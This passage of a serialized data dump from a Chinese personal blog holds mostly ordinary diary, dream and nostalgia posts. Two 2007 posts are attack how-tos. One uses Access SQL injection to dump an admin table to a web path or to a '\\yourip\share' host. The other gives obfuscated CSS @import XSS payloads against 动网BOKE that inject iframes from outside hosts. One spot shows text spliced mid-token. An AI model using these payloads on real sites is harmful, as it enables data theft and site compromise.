 沙尔克 VS 阿森纳    |   31     |  1   |\n|  4   |   奥林匹 VS 蒙彼利埃    |   31     |  3   |\n|  5   |     AC米兰 VS 马拉加    |   310    |  1   |\n|  6   |     安德莱 VS 泽尼特    |   310    |  3   |\n|  7   |     曼 城 VS 阿贾克斯   |   31     |  1   |\n|  8   |    皇 马 VS 多 特蒙德   |   31     |  1   |\n|  9   |      切尔西 VS 矿 工    |    3     |      |\n| 10   |   尤文图斯 VS 北西兰    |    3     |      |\n| 11   |     巴伦西亚 VS 巴特    |    3     |      |\n| 12   |       拜仁 VS 里尔      |    3     |      |\n| 13   |    凯尔特人 VS 巴萨     |   10     |      |\n| 14   |      布拉加 VS 曼 联    |   310    |      |</p>\n<hr>\n&quot;]}],&quot;slug&quot;:[0,&quot;kanqiushiyizhongxinliboyitebieshimailezuqiucaipiaoderen&quot;]}],[0,{&quot;title&quot;:[0,&quot;梦到大学城里的人&quot;],&quot;description&quot;:[0,&quot;<p><img src=\&quot;/images/cities/langfang.jpg\&quot; alt=\&quot;东方大学城\&quot;>\n昨夜竟又梦回大学城了。</p>\n<p>梦里见到了张冠成，还有一个长得酷似易天的家伙。张冠成还是老样子，手指敲着他那台IBM笔记本，嗒嗒作响——只是梦里听说，他已不再是当年那个守着维修小店的技术员，摇身一变成了作家，笔名还改叫“张中雨”了。想想真是恍然，离开那片喧闹拥挤的大学城，竟已快六个寒暑。梦里他们的脸却如此清晰，名字也脱口而出，仿佛昨天才道别。</p>\n<p>常耍滑头的老板易天，埋头技术的张冠成，萍乡来的好兄弟易海斌和李敏，总像大姐姐一样照顾人的长春姑娘李桂凤，还有福建的张栋梁……记忆一下子涌上来。还有那个我们蜗居过的小村子，那间拥挤却充满故事的小屋，那里埋藏着一切的开始。只是那时的我啊，懵懵懂懂，眼睛里只装着眼前那点事，看不清也抓不住未来的影子，现在想来，多少有点傻气。</p>\n<p>梦还在继续。我不知为何穿了件从不会碰的坎肩，在街上晃悠。迎面竟碰上了乔乔、二猪和崔崔！那一瞬间，几乎是本能地想躲开，想装作没看见。大约是因为坎肩下，肩膀上那道旧年留下的疤痕吧，总是不愿让故友瞧见。可朋友终究是朋友，你假装没看见，他们却真切地看见了你，那声熟悉的招呼，是无论如何也躲不掉的。只是奇怪，向来不穿坎肩的我，那会儿怎么就穿着它，大剌剌走在街上了呢？</p>\n<p>这些人啊，一别经年。有的散落在天涯，断了音讯；有的或许只是阴差阳错，再未得见。时间推着人往前走，记忆却固执地留在原地。只盼着，若真有重逢那天，你们可别装作认不得我这张脸了。</p>\n&quot;],&quot;data&quot;:[0,{&quot;author&quot;:[0,&quot;Xio&quot;],&quot;pubDatetime&quot;:[3,&quot;2012-08-03T10:30:00.000Z&quot;],&quot;title&quot;:[0,&quot;梦到大学城里的人&quot;],&quot;featured&quot;:[0,false],&quot;draft&quot;:[0,false],&quot;tags&quot;:[1,[[0,&quot;记录&quot;],[0,&quot;回忆&quot;],[0,&quot;梦&quot;]]],&quot;description&quot;:[0,&quot;<p><img src=\&quot;/images/cities/langfang.jpg\&quot; alt=\&quot;东方大学城\&quot;>\n昨夜竟又梦回大学城了。</p>\n<p>梦里见到了张冠成，还有一个长得酷似易天的家伙。张冠成还是老样子，手指敲着他那台IBM笔记本，嗒嗒作响——只是梦里听说，他已不再是当年那个守着维修小店的技术员，摇身一变成了作家，笔名还改叫“张中雨”了。想想真是恍然，离开那片喧闹拥挤的大学城，竟已快六个寒暑。梦里他们的脸却如此清晰，名字也脱口而出，仿佛昨天才道别。</p>\n<p>常耍滑头的老板易天，埋头技术的张冠成，萍乡来的好兄弟易海斌和李敏，总像大姐姐一样照顾人的长春姑娘李桂凤，还有福建的张栋梁……记忆一下子涌上来。还有那个我们蜗居过的小村子，那间拥挤却充满故事的小屋，那里埋藏着一切的开始。只是那时的我啊，懵懵懂懂，眼睛里只装着眼前那点事，看不清也抓不住未来的影子，现在想来，多少有点傻气。</p>\n<p>梦还在继续。我不知为何穿了件从不会碰的坎肩，在街上晃悠。迎面竟碰上了乔乔、二猪和崔崔！那一瞬间，几乎是本能地想躲开，想装作没看见。大约是因为坎肩下，肩膀上那道旧年留下的疤痕吧，总是不愿让故友瞧见。可朋友终究是朋友，你假装没看见，他们却真切地看见了你，那声熟悉的招呼，是无论如何也躲不掉的。只是奇怪，向来不穿坎肩的我，那会儿怎么就穿着它，大剌剌走在街上了呢？</p>\n<p>这些人啊，一别经年。有的散落在天涯，断了音讯；有的或许只是阴差阳错，再未得见。时间推着人往前走，记忆却固执地留在原地。只盼着，若真有重逢那天，你们可别装作认不得我这张脸了。</p>\n&quot;]}],&quot;slug&quot;:[0,&quot;2012-08-03&quot;]}],[0,{&quot;title&quot;:[0,&quot;那些纯真的往事&quot;],&quot;description&quot;:[0,&quot;<p><a href=\&quot;https://copyright.bdstatic.com/vcg/edit/bc6c8f72ee67da193e62f7110dac29c9.jpg\&quot;><img src=\&quot;https://copyright.bdstatic.com/vcg/edit/bc6c8f72ee67da193e62f7110dac29c9.jpg\&quot; alt=\&quot;\&quot;></a></p>\n<p>这是一个安静的夜晚，雨滴不停地打在门窗前，显得这个夜更加静谧。看到电视中那些偶像情感剧，心中不免有些共鸣。</p>\n<p>岁月如歌，一路走过的青春岁月，青春无悔，岁月有痕。走过风走过雨，漫漫人生路上经历过的人和事不少。无论岁月如何流逝，在我们心中，许多人依然珍藏着那段纯真的青春岁月，每一个见证都是一段故事，每当想起，都让人心中无比向往。只是流年似水，一切如过眼云烟，随着时间愈发遥远，只能永留心底，成为难忘的记忆。</p>\n<p>在那个纯真年代，这些故事是我们最直接的青春见证。打开故事的首页，记忆的沙漏开始倒流，往事堆积，占据心灵的空间。记忆中的往事如同故事情节，在心中清晰再现，演绎着那段纯真的岁月。有些往事令人伤怀，每当忆起，总有些失落和遗憾。青春岁月，有时是明媚却带着忧伤的风景线。</p>\n<p>真挚的感情，纯朴的友谊，落幕的情怀，青涩的年华里遗憾了的爱情、友情与亲情，留在记忆中的那些往事，青春无悔，岁月如歌，如梦如烟。</p>\n<p>春夏秋冬，四季轮回，往事如烟，日子如蝶般飞逝。岁月无情，在脸上刻下痕迹，也在心田刻下深浅不一的记忆。夜深人静时，午夜梦回，许多人和事会被莫名忆起。那些纯真、童心未泯、永远带着笑容的脸庞，在眼前清晰浮现。</p>\n<p>青春无悔，岁月如歌，似水流年中，很多人和事已成心底或深或浅的记忆。每当夜静如水，午夜梦回，迎着凉风静立窗前，思绪四散，心中总有一个角落，既感动又疼痛。</p>\n&quot;],&quot;data&quot;:[0,{&quot;author&quot;:[0,&quot;Xio&quot;],&quot;pubDatetime&quot;:[3,&quot;2011-09-25T07:02:40.000Z&quot;],&quot;title&quot;:[0,&quot;那些纯真的往事&quot;],&quot;featured&quot;:[0,false],&quot;draft&quot;:[0,false],&quot;tags&quot;:[1,[[0,&quot;人生&quot;],[0,&quot;情感&quot;]]],&quot;description&quot;:[0,&quot;<p><a href=\&quot;https://copyright.bdstatic.com/vcg/edit/bc6c8f72ee67da193e62f7110dac29c9.jpg\&quot;><img src=\&quot;https://copyright.bdstatic.com/vcg/edit/bc6c8f72ee67da193e62f7110dac29c9.jpg\&quot; alt=\&quot;\&quot;></a></p>\n<p>这是一个安静的夜晚，雨滴不停地打在门窗前，显得这个夜更加静谧。看到电视中那些偶像情感剧，心中不免有些共鸣。</p>\n<p>岁月如歌，一路走过的青春岁月，青春无悔，岁月有痕。走过风走过雨，漫漫人生路上经历过的人和事不少。无论岁月如何流逝，在我们心中，许多人依然珍藏着那段纯真的青春岁月，每一个见证都是一段故事，每当想起，都让人心中无比向往。只是流年似水，一切如过眼云烟，随着时间愈发遥远，只能永留心底，成为难忘的记忆。</p>\n<p>在那个纯真年代，这些故事是我们最直接的青春见证。打开故事的首页，记忆的沙漏开始倒流，往事堆积，占据心灵的空间。记忆中的往事如同故事情节，在心中清晰再现，演绎着那段纯真的岁月。有些往事令人伤怀，每当忆起，总有些失落和遗憾。青春岁月，有时是明媚却带着忧伤的风景线。</p>\n<p>真挚的感情，纯朴的友谊，落幕的情怀，青涩的年华里遗憾了的爱情、友情与亲情，留在记忆中的那些往事，青春无悔，岁月如歌，如梦如烟。</p>\n<p>春夏秋冬，四季轮回，往事如烟，日子如蝶般飞逝。岁月无情，在脸上刻下痕迹，也在心田刻下深浅不一的记忆。夜深人静时，午夜梦回，许多人和事会被莫名忆起。那些纯真、童心未泯、永远带着笑容的脸庞，在眼前清晰浮现。</p>\n<p>青春无悔，岁月如歌，似水流年中，很多人和事已成心底或深或浅的记忆。每当夜静如水，午夜梦回，迎着凉风静立窗前，思绪四散，心中总有一个角落，既感动又疼痛。</p>\n&quot;]}],&quot;slug&quot;:[0,&quot;naxiechunzhendewangshi&quot;]}],[0,{&quot;title&quot;:[0,&quot;梦，2011年6月21日&quot;],&quot;description&quot;:[0,&quot;<p>雨从天际倾泻而下，像一张巨大的灰纱，将整个校园罩得模糊。\n早自习的教室里，时间混乱得像旧抽屉里翻出的信——初中的课桌，高中的面孔，几位老师穿梭其中，却没人觉得奇怪。</p>\n<p>我坐在第一排正中，你在第四排靠过道的位置。湿气里，我点燃一支烟，白雾与雨气交融，像一层轻薄的帘子。门被推开，历史老师抱怨着天气，然后不知怎么，黑板上就变成了试卷。</p>\n<p>我把那半支烟随手丢在身后，低头做题。笔划在纸上急促游走，直到同桌伸手拿走了我的钢笔——她一直改自己的卷子，好像忘了时间。我的题还剩最后一道，时钟却逼近终点。就在我心口发紧时，老师忽然说：“明天再交吧。”空气里仿佛有人轻轻解开了一个扣子。</p>\n<p>下课铃响，我收回钢笔，补完那道题。站起身时，看到板凳旁的烟还在冒着细细的光。我摸了摸裤子，没有烧痕，便又吸了一口。背后传来轻轻的咳嗽声。</p>\n<p>我问同学要不要去吃早饭，他摇头，说早操前就吃过了。\n我想大声问谁没吃，一起去，却终究没开口。于是，我一个人朝后门走去——我们班的后门通向走廊，前门只是通往空荡的阳台。</p>\n<p>路过你身边，我像往常那样伸手勾住你的肩。你没有拒绝，顺着我的脚步走出去。\n“ What are you doing recently? ” 我问。\n你侧头，声音像隔着一层雾：“Really pardon?”\n我又说了一遍。你只是沉默。</p>\n<p>直到拐角处，我忽然松开手，低声说：“不好意思，我认错人了。”\n你停住了，我独自向前，心里一遍遍问自己——为什么要说这种拙劣的借口？像个恋爱中慌乱的少年。可我并不是啊……</p>\n<p>小食堂在前方，可我并不饿。于是转身，往回走。就在转身的瞬间，我醒了。</p>\n<p>枕边的空气凉凉的，雨声还在延续。梦里的你，一句话都没留下。\n也许，我真的太想你了。以至于连在梦里，也要假装什么都不是。</p>\n<p>//梦中出现的人:何元彬,吴元波,梁大伦,董青波,谢轩,曹连菊,唐继科,徐李林。//\n<img src=\&quot;/images/dream2011.png\&quot; alt=\&quot;梦境\&quot;></p>\n&quot;],&quot;data&quot;:[0,{&quot;author&quot;:[0,&quot;Xio&quot;],&quot;pubDatetime&quot;:[3,&quot;2011-06-21T08:08:30.000Z&quot;],&quot;title&quot;:[0,&quot;梦，2011年6月21日&quot;],&quot;featured&quot;:[0,false],&quo ta&quot;:[0,{&quot;author&quot;:[0,&quot;Xio&quot;],&quot;pubDatetime&quot;:[3,&quot;2011-01-29T02:08:30.000Z&quot;],&quot;title&quot;:[0,&quot;开始记录 某些点点滴滴&quot;],&quot;featured&quot;:[0,false],&quot;draft&quot;:[0,false],&quot;tags&quot;:[1,[[0,&quot;生活&quot;],[0,&quot;记录&quot;],[0,&quot;回忆&quot;]]],&quot;description&quot;:[0,&quot;<p>时光荏苒，总有一些美好的瞬间值得被记录下来。今天开始，我想用文字和图片来记录生活中的点点滴滴。</p>\n<h3>高三的期末成绩</h3>\n<p>高三那年的期末考试，每一次成绩单都承载着对未来的期望与忐忑。</p>\n<p><img src=\&quot;/images/qimokaoshi.jpg\&quot; alt=\&quot;期末考试成绩\&quot;></p>\n<p>那些数字不仅仅是分数，更是青春岁月里拼搏的见证，是通往梦想路上的重要里程碑。</p>\n<h3>初三的毕业留言</h3>\n<p>初中毕业时，同学们在留言册上写下的真挚话语，至今读来仍然温暖如初。</p>\n<p><img src=\&quot;/images/biyeliuyan.jpg\&quot; alt=\&quot;毕业留言\&quot;></p>\n<p>这些稚嫩却真诚的文字，记录着那个年纪最纯真的友谊，是青春记忆中最珍贵的片段。</p>\n<h3>高中的学习笔记</h3>\n<p>那些密密麻麻的笔记，记录着求学路上的点点滴滴。</p>\n<p><img src=\&quot;/images/xuexibiji.jpg\&quot; alt=\&quot;学习笔记\&quot;></p>\n<p>每一页笔记都承载着当时的认真与努力，那些工整的字迹诉说着青春年华里对知识的渴望。</p>\n<h3>写在最后</h3>\n<p>生活中有太多值得记录的美好瞬间，从今天开始，我要用心记录下这些点点滴滴。无论是学习中的收获，还是生活中的感悟，都将成为我人生路上珍贵的财富。</p>\n<p>愿时光不老，友谊长存。愿所有的美好都能被妥善保存，在未来的某个时刻，能够重新温暖我们的心房。</p>\n&quot;]}],&quot;slug&quot;:[0,&quot;2011-01-29&quot;]}],[0,{&quot;title&quot;:[0,&quot;利用Access SQL注入导出ASP文件的方法&quot;],&quot;description&quot;:[0,&quot;<p>已经听N个人过说有人已经发现SQL注入Access得到webshell的技术了，也只是听说而已，具体的细节还是不得而知。</p>\n<p>最近在看的书中一章提到Jet的安全，然后灵光一闪，呵呵，发现了一种可以利用access导出asp的方法，分享之。</p>\n<h2>传统的导出方法</h2>\n<p>几个月之前网上就流传利用SQL注入Access导出数据库内容到文本文件（可导出txt、htm、html等格式）的方法：</p>\n<pre><code class=\&quot;language-sql\&quot;>Select * into [test.txt] in 'd:\\web\\' 'text;' from admin\n</code></pre>\n<p>执行上述语句，在d:\\web目录下就会生成test.txt文件，其内容就是表admin的内容。但是导出asp格式就不行，会说\&quot;不能更新，数据库或对象为只读\&quot;。</p>\n<h2>问题的根源</h2>\n<p>其实控制导出文件后缀是存储在注册表的，具体键值是：</p>\n<pre><code>HKEY_LOCALMACHINE\\Software\\Microsoft\\Jet\\4.0\\Engines\\Text\\DisableExtension\n</code></pre>\n<p>默认情况下值为<code>\&quot;!txt,csv,tab,asc,tmp,htm,html\&quot;</code>，如果我们把asp也添加进去的话，呵呵，就可以导出asp格式的文件了。</p>\n<p>这个方法跟那个调用Access的Shell函数执行命令一样，要修改注册表，所以利用不是很大。</p>\n<h2>扩展思路</h2>\n<p>顺便提一下，前面提到的导出文本文件的方法如果不知道web路径貌似可以导出到自己机器的哦：</p>\n<pre><code class=\&quot;language-sql\&quot;>Select * into [test.txt] in '\\\\yourip\\share' 'text;' from admin\n</code></pre>\n<h2>实际测试</h2>\n<p>我在我自己的blog上测试，没有得用注入，直接exec sql语句形成：</p>\n<pre><code class=\&quot;language-sql\&quot;>Select gb_Author into [222.txt] in 'D:\\wwwroot\\starstudio\\wwwroot\\' 'text;' from blog_Guestbook\n</code></pre>\n<p>竟然真生成了txt文件了，当时可以访问 starstudio.cn/222.txt（现在域名已经失效，starstudio已经躺在本地硬盘中了）</p>\n<p>不行可以试试访问............利用注点怎么得asp还得好好研究下</p>\n&quot;],&quot;data&quot;:[0,{&quot;author&quot;:[0,&quot;Xio&quot;],&quot;pubDatetime&quot;:[3,&quot;2007-03-17T10:30:00.000Z&quot;],&quot;title&quot;:[0,&quot;利用Access SQL注入导出ASP文件的方法&quot;],&quot;featured&quot;:[0,false],&quot;draft&quot;:[0,false],&quot;tags&quot;:[1,[[0,&quot;SQL注入&quot;],[0,&quot;Access&quot;],[0,&quot;ASP&quot;],[0,&quot;安全&quot;]]],&quot;description&quot;:[0,&quot;<p>已经听N个人过说有人已经发现SQL注入Access得到webshell的技术了，也只是听说而已，具体的细节还是不得而知。</p>\n<p>最近在看的书中一章提到Jet的安全，然后灵光一闪，呵呵，发现了一种可以利用access导出asp的方法，分享之。</p>\n<h2>传统的导出方法</h2>\n<p>几个月之前网上就流传利用SQL注入Access导出数据库内容到文本文件（可导出txt、htm、html等格式）的方法：</p>\n<pre><code class=\&quot;language-sql\&quot;>Select * into [test.txt] in 'd:\\web\\' 'text;' from admin\n</code></pre>\n<p>执行上述语句，在d:\\web目录下就会生成test.txt文件，其内容就是表admin的内容。但是导出asp格式就不行，会说\&quot;不能更新，数据库或对象为只读\&quot;。</p>\n<h2>问题的根源</h2>\n<p>其实控制导出文件后缀是存储在注册表的，具体键值是：</p>\n<pre><code>HKEY_LOCALMACHINE\\Software\\Microsoft\\Jet\\4.0\\Engines\\Text\\DisableExtension\n</code></pre>\n<p>默认情况下值为<code>\&quot;!txt,csv,tab,asc,tmp,htm,html\&quot;</code>，如果我们把asp也添加进去的话，呵呵，就可以导出asp格式的文件了。</p>\n<p>这个方法跟那个调用Access的Shell函数执行命令一样，要修改注册表，所以利用不是很大。</p>\n<h2>扩展思路</h2>\n<p>顺便提一下，前面提到的导出文本文件的方法如果不知道web路径貌似可以导出到自己机器的哦：</p>\n<pre><code class=\&quot;language-sql\&quot;>Select * into [test.txt] in '\\\\yourip\\share' 'text;' from admin\n</code></pre>\n<h2>实际测试</h2>\n<p>我在我自己的blog上测试，没有得用注入，直接exec sql语句形成：</p>\n<pre><code class=\&quot;language-sql\&quot;>Select gb_Author into [222.txt] in 'D:\\wwwroot\\starstudio\\wwwroot\\' 'text;' from blog_Guestbook\n</code></pre>\n<p>竟然真生成了txt文件了，当时可以访问 starstudio.cn/222.txt（现在域名已经失效，starstudio已经躺在本地硬盘中了）</p>\n<p>不行可以试试访问............利用注点怎么得asp还得好好研究下</p>\n&quot;]}],&quot;slug&quot;:[0,&quot;pjblog-2007-03-17&quot;]}],[0,{&quot;title&quot;:[0,&quot;动网BOKE的CSS跨站漏洞分析&quot;],&quot;description&quot;:[0,&quot;<p>前一段时间，找到了动网 BOKE的跨站漏洞，这个漏洞可以用CSS来跨站，也就是样式表，具体的跨站方法是：</p>\n<h2>基本利用方法</h2>\n<p>选择\&quot;代码\&quot;方式，在其中输入以下代码：</p>\n<pre><code class=\&quot;language-html\&quot;>&amp;#x3C;style type='text/css'>@import url(http://www.pc010.cn/1.css);&amp;#x3C;/style>\n</code></pre>\n<p>其中的@import 是CSS的自定义属性，url是要链接的CSS样式，而 http://www.pc010.cn/1.css 的内容如下：</p>\n<pre><code class=\&quot;language-css\&quot;>&amp;#x3C;style type=\&quot;text/css\&quot;>\n&amp;#x3C;!--\n@import url(javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,84,101,115,116,32,49,39,41,59,97,108,101,114,116,40,39,84,101,115,116,32,50,39,41,59)));\n-->\n&amp;#x3C;/style>\n</code></pre>\n<p>这是一段弹出alert窗口的代码，其中的String.fromCharCode是用来将字符转为ASCII值的函数。</p>\n<h2>打开新窗口的代码</h2>\n<p>OPEN 的代码如下：</p>\n<pre><code class=\&quot;language-javascript\&quot;>@import url(javascript:eval(String.fromCharCode(111,112,101,110,40,39,104,116,116,112,58,47,47,119,119,119,46,110,111,104,97,99,107,46,99,110,39,44,39,-17702,-16435,-13610,-19743,39,44,39,119,105,100,116,104,61,50,48,48,44,104,101,105,103,104,116,61,50,48,48,39,41,59)));\n</code></pre>\n<h2>隐藏显示方法</h2>\n<p>如果是要在当前窗口隐藏显示，可用document.body.innerHTML方法，代码是：</p>\n<pre><code class=\&quot;language-javascript\&quot;>document.body.innerHTML=document.body.innerHTML+\&quot;&amp;#x3C;iframe frameborder=0 width=200 height=200 scrolling=no src=http://www.pc010.cn>&amp;#x3C;/iframe>\&quot;;\n</code></pre>\n<p>将以上的字符用ASCII转换工具转为ASCII值，放入String.fromCharCode函数中，就可以了。</p>\n<h2>简化的利用方式</h2>\n<p>当然，也可以不用String.fromCharCode函数，直接引入代码的语句是：</p>\n<pre><code class=\&quot;language-javascript\&quot;>@import url(javascript:eval(\&quot;document.body.innerHTML=document.body.innerHTML+'&amp;#x3C;iframe frameborder=0 width=200 height=200 scrolling=no src=http://www.baidu.com>&amp;#x3C;/iframe>';\&quot;));\n</code></pre>\n<p>其中字符要用双引号引入才行。</p>\n<h2>最简单的方法</h2>\n<p>如果再去掉eval，那么语句就是：</p>\n<pre><code class=\&quot;language-javascript\&quot;>@import url(javascript:document.body.innerHTML=document.body.innerHTML+\&quot;&amp;#x3C;iframe frameborder=0 width=200 height=200 scrolling=no src=http://www.baidu.com>&amp;#x3C;/iframe>\&quot;);\n</code></pre>\n<p>常量用双引号引入，而变量则直接引入，两者之间用+来连接，如果有特殊的字符，则可用String.fromCharCode进行转换，比如\&quot;&amp;#x3C;\&quot;，则可用String.fromCharCode(60)代替。</p>\n<h2>技术总结</h2>\n<p>这个漏洞利用了CSS的@import特性和javascript:协议的结合，绕过了常规的XSS过滤。动网BOKE在处理用户输入的CSS代码时没有进行充分的过滤，导致了这个安全问题。</p>\n<p>这种利用方式比较隐蔽，因为表面上看起来只是在引入CSS样式文件，实际上却执行了恶意的JavaScript代码。</p>\n<p>建议网站管理员对用户输入的CSS代码进行严格过滤，特别是@import和javascript:这类可能存在安全风险的内容。</p>\n&quot;],&quot;data&quot;:[0,{&quot;author&quot;:[0,&quot;Xio&quot;],&quot;pubDatetime&quot;:[3,&quot;2007-03-16T15:20:00.000Z&quot;],&quot;title&quot;:[0,&quot;动网BOKE的CSS跨站漏洞分析&quot;],&quot;featured&quot;:[0,false],&quot;draft&quot;:[0,false],&quot;tags&quot;:[1,[[0,&quot;XSS&quot;],[0,&quot;CSS&quot;],[0,&quot;动网&quot;],[0,&quot;跨站&quot;],[0,&quot;安全漏洞&quot;]]],&quot;description&quot;:[0,&quot;<p>前一段时间，找到了动网 BOKE的跨站漏洞，这个漏洞可以用CSS来跨站，也就是样式表，具体的跨站方法是：</p>\n<h2>基本利用方法</h2>\n<p>选择\&quot;代码\&quot;方式，在其中输入以下代码：</p>\n<pre><code class=\&quot;language-html\&quot;>&amp;#x3C;style type='text/css'>@import url(http://www.pc010.cn/1.css);&amp;#x3C;/style>\n</code></pre>\n<p>其中的@import 是CSS的自定义属性，url是要链接的CSS样式，而 http://www.pc010.cn/1.css 的内容如下：</p>\n<pre><code class=\&quot;language-css\&quot;>&amp;#x3C;style type=\&quot;text/css\&quot;>\n&amp;#x3C;!--\n@import url(javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,84,101,115,116,32,49,39,41,59,97,108,101,114,116,40,39,84,101,115,116,32,50,39,41,59)));\n-->\n&amp;#x3C;/style>\n</code></pre>\n<p>这是一段弹出alert窗口的代码，其中的String.fromCharCode是用来将字符转为ASCII值的函数。</p>\n<h2>打开新窗口的代码</h2>\n<p>OPEN 的代码如下：</p>\n<pre><code class=\&quot;language-javascript\&quot;>@import url(javascript:eval(String.fromCharCode(111,112,101,110,40,39,104,116,116,112,58,47,47,119,119,119,46,110,111,104,97,99,107,46,99,110,39,44,39,-17702,-16435,-13610,-19743,39,44,39,119,105,100,116,104,61,50,48,48,44,104,101,105,103,104,116,61,50,48,48,39,41,59)));\n</code></pre>\n<h2>隐藏显示方法</h2>\n<p>如果是要在当前窗口隐藏显示，可用document.body.innerHTML方法，代码是：</p>\n<pre><code class=\&quot;language-javascript\&quot;>document.body.innerHTML=document.body.innerHTML+\&quot;&amp;#x3C;iframe frameborder=0 width=200 height=200 scrolling=no src=http://www.pc010.cn>&amp;#x3C;/iframe>\&quot;;\n</code></pre>\n<p>将以上的字符用ASCII转换工具转为ASCII值，放入String.fromCharCode函数中，就可以了。</p>\n<h2>简化的利用方式</h2>\n<p>当然，也可以不用String.fromCharCode函数，直接引入代码的语句是：</p>\n<pre><code class=\&quot;language-javascript\&quot;>@import url(javascript:eval(\&quot;document.body.innerHTML=document.body.innerHTML+'&amp;#x3C;iframe frameborder=0 width=200 height=200 scrolling=no src=http://www.baidu.com>&amp;#x3C;/iframe>';\&quot;));\n</code></pre>\n<p>其中字符要用双引号引入才行。</p>\n<h2>最简单的方法</h2>\n<p>如果再去掉eval，那么语句就是：</p>\n<pre><code class=\&quot;language-javascript\&quot;>@import url(javascript:document.body.innerHTML=document.body.innerHTML+\&quot;&amp;#x3C;iframe frameborder=0 width=200 height=200 scrolling=no src=http://www.baidu.com>&amp;#x3C;/iframe>\&quot;);\n</code></pre>\n<p>常量用双引号引入，而变量则直接引入，两者之间用+来连接，如果有特殊的字符，则可用String.fromCharCode进行转换，比如\&quot;&amp;#x3C;\&quot;，则可用String.fromCharCode(60)代替。</p>\n<h2>技术总结</h2>\n<p>这个漏洞利用了CSS的@import特性和javascript:协议的结合，绕过了常规的XSS过滤。动网BOKE在处理用户输入的CSS代码时没有进行充分的过滤，导致了这个安全问题。</p>\n<p>这种利用方式比较隐蔽，因为表面上看起来只是在引入CSS样式文件，实际上却执行了恶意的JavaScript代码。</p>\n<p>建议网站管理员对用户输入的CSS代码进行严格过滤，特别是@import和javascript:这类可能存在安全风险的内容。</p>\n&quot;]}],&quot;slug&quot;:[0,&quot;pjblog-2007-03-16&quot;]}],[0,{&quot;title&quot;:[0,&quot;关于10级大风的预报&quot;],&quot;description&quot;:[0,&quot;<p>昨天老爸说今天会有10级大风，我怎么也想不到这个偏僻的山区会有这么大的风。开玩笑对隔房表姐说，你还是把你的信用卡拿上躲到红薯窖里面去吧，呵呵。</p>\n<p>结果风确实起了，但没有预报的那么大。</p>\n<p>最近手气不错，昨天又赢钱了。不过这样下去，朋友们都要说我成赌徒了。</p>\n<p>有点郁闷，TOM那边出了点状况，下起了暴雪！等会上QQ问问情况再说。</p>\n<p>先这样了。</p>\n<hr>\n<p><em>写于2007年3月4日，记录当时的生活片段。</em></p>\n&quot;],&quot;data&quot;:[0,{&quot;author&quot;:[0,&quot;Xio&quot;],&quot;pubDatetime&quot;:[3,&quot;2007-03-04T20:18:00.000Z&quot;],&quot;title&quot;:[0,&quot;关于10级大风的预报&quot;],&quot;featured&quot;:[0,false],&quot;draft&quot;:[0,false],&quot;tags&quot;:[1,[[0,&quot;生活&quot;],[0,&quot;日记&quot;],[0,&quot;天气&quot;],[0,&quot;随想&quot;]]],&quot;description&quot;:[0,&quot;<p>昨天老爸说今天会有10级大风，我怎么也想不到这个偏僻的山区会有这么大的风。开玩笑对隔房表姐说，你还是把你的信用卡拿上躲到红薯窖里面去吧，呵呵。</p>\n<p>结果风确实起了，但没有预报的那么大。</p>\n<p>最近手气不错，昨天又赢钱了。不过这样下去，朋友们都要说我成赌徒了。</p>\n<p>有点郁闷，TOM那边出了点状况，下起了暴雪！等会上QQ问问情况再说。</p>\n<p>先这样了。</p>\n<hr>\n<p><em>写于2007年3月4日，记录当时的生活片段。</em></p>\n&quot;]}],&quot;slug&quot;:[0,&quot;pjblog-2007-03-04&quot;]}],[0,{&quot;title&quot;:[0,&quot;樱花又开了&quot;],&quot;description&quot;:[0,&quot;<p><img src=\&quot;/images/07yc_pic00013.jpg\&quot; alt=\&quot;樱花盛开\&quot;></p>\n<p><img src=\&quot;/images/96yc_pic00016.jpg\&quot; alt=\&quot;春日樱花\&quot;></p>\n<p><img src=\&quot;/images/xum1_pic00017.jpg\&quot; alt=\&quot;樱花枝头\&quot;></p>\n<p><img src=\&quot;/images/gd6k_pic00018.jpg\&quot; alt=\&quot;满树樱花\&quot;></p>\n<p>樱花又开了，春天真的来了。</p>\n<p>每年这个时候，看到满树的樱花，总是让人心情愉悦。粉色的花瓣在微风中轻舞，仿佛在告诉我们，新的一年又开始了。</p>\n<hr>\n<p><em>拍摄于2007年3月1日</em></p>\n<p><em>天气：多云</em></p>\n&quot;],&quot;data&quot;:[0,{&quot;author&quot;:[0,&quot;Xio&quot;],&quot;pubDatetime&quot;:[3,&quot;2007-03-01T01:36:16.000Z&quot;],&quot;title&quot;:[0,&quot;樱花又开了&quot;],&quot;featured&quot;:[0,false],&quot;draft&quot;:[0,false],&quot;tags&quot;:[1,[[0,&quot;樱花&quot;],[0,&quot;春天&quot;],[0,&quot;摄影&quot;],[0,&quot;生活&quot;]]],&quot;description&quot;:[0,&quot;<p><img src=\&quot;/images/07yc_pic00013.jpg\&quot; alt=\&quot;樱花盛开\&quot;></p>\n<p><img src=\&quot;/images/96yc_pic00016.jpg\&quot; alt=\&quot;春日樱花\&quot;></p>\n<p><img src=\&quot;/images/xum1_pic00017.jpg\&quot; alt=\&quot;樱花枝头\&quot;></p>\n<p><img src=\&quot;/images/gd6k_pic00018.jpg\&quot; alt=\&quot;满树樱花\&quot;></p>\n<p>樱花又开了，春天真的来了。</p>\n<p>每年这个时候，看到满树的樱花，总是让人心情愉悦。粉色的花瓣在微风中轻舞，仿佛在告诉我们，新的一年又开始了。</p>\n<hr>\n<p><em>拍摄于2007年3月1日</em></p>\n<p><em>天气：多云</em></p>\n&quot;]}],&quot;slug&quot;:[0,&quot;pjblog-2007-03-01&quot;]}],[0,{&quot;title&quot;:[0,&quot;我在7月的最惨淡时刻&quot;],&quot;description&quot;:[0,&quot;<p>秋天还没到来，我却又要飘了，然而，此时此刻却再没有黄叶做伴....</p>\n<p>绵阳是一个不大不小的城市，拥有形形色色其他城市不能攀比的韵味。可是我却并不留恋在一个固定的地方，比如这个城市。当然，除了我在绝望时会怀念归宿，我就绝不会有其他例外了。我不知道什么东西才能抵制住我飘的欲望，也许，根本就不会有什么东西来抑制我的思想，又或许我本来就注定是漂浮不定的...</p>\n<p>明天，我就要踏上回家的列车回到我久违的故乡，我知道那里现在一定是绿树成荫，花开正好，温度适宜清爽的美好季节。我明白，在那样的空间里面会让我忘记很多不想纪念的事情，我期待父亲叫我吃饭的声音，依然怀念我和老爸抢电脑玩的那激动场面，甚至是一起玩玩麻将也行，这都是令我神往的事情，当然这只是在一种特定场面下的幸福感觉！</p>\n<p>对于绵阳，我不知道我到底收获了什么，或者是收益了什么，更或者是说我为什么能够在绵阳待这么久，我都不是很清楚。唯一肯定的是工作是次要的约束因素，更主要在于